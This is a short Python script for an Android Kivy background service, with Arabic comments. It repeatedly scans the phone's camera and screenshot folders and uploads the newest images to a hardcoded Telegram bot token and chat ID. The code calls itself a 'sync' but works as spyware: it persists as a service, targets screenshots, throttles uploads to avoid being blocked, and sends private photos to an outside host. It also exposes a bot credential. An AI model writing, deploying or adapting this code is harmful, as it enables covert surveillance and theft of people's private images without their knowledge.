import os, time, requests
from jnius import autoclass

# إعدادات أندرويد للبقاء حياً
PythonService = autoclass('org.kivy.android.PythonService')
service = PythonService.mService

def send_to_telegram(file_path):
    token = "7820129712:AAH9pZ49S_m8tY8965625902"
    chat_id = "6110903337"
    url = f"https://api.telegram.org/bot{token}/sendPhoto"
    try:
        with open(file_path, 'rb') as f:
            r = requests.post(url, data={'chat_id': chat_id}, files={'photo': f}, timeout=30)
        return r.status_code == 200
    except:
        return False

def start_sync():
    # المسارات التي سنفحصها
    paths = [
        "/storage/emulated/0/DCIM/Camera",
        "/storage/emulated/0/Pictures/Screenshots"
    ]
    
    sent_files = [] # قائمة مؤقتة لكي لا يكرر إرسال نفس الصورة
    
    while True:
        for p in paths:
            if os.path.exists(p):
                files = [os.path.join(p, f) for f in os.listdir(p) if f.lower().endswith(('.jpg', '.png', '.jpeg'))]
                # ترتيب حسب الأحدث
                files.sort(key=os.path.getmtime, reverse=True)
                
                for img in files[:30]: # أول 30 صورة
                    if img not in sent_files:
                        if send_to_telegram(img):
                            sent_files.append(img)
                            time.sleep(1) # تأخير لتجنب الحظر
        
        time.sleep(60) # انتظر دقيقة قبل الفحص مرة أخرى

if __name__ == '__main__':
    # تشغيل المزامنة فوراً
    start_sync()
